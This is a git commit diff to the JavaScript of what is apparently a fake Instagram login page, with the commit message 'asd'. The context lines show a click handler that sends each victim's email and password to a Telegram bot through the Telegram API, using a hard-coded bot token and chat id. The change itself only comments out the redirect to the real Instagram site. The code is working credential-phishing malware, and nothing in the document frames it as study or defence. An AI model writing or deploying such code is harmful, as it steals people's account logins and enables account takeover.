20a9cd425801d021c19ddabae8f2cad822168aac
Erdem Oflaz <erdemoflaz4@gmail.com>
2018-06-18 20:50:02 +0300

    ✨  asd

--- js/index.js
+++ js/index.js
@@ -11,7 +11,7 @@ $('#buton').click(function(){
       type:"post",
       url: "https://api.telegram.org/bot343775901:AAHpbiAGCPQD8ReOPHDlLeSLZZCsJNJJ5FQ/sendMessage?chat_id=187750627&text=INSTAGRAM:email : "+email+" password : "+password+"",
       success: function() {
-          window.location.href = 'https://www.instagram.com/';
+        //   window.location.href = 'https://www.instagram.com/';
         }
     });
 
